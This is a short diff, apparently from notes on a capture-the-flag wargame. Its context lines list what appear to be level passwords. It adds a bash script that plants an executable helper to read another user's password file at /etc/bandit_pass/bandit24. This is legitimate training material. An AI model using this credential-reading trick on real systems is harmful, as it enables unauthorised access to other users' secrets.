@@ -22,3 +22,11 @@ Level:
 21: bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY
 22: RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz
 23: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+#!/bin/bash  
+echo "Hello it is $(whoami)"    
+mypath=$(mktemp -d)  
+echo $mypath  
+  
+echo 'cat /etc/bandit_pass/bandit24' > $mypath/newscript.sh  
+chmod a+rx $mypath/newscript.sh  
+$mypath/newscript.sh
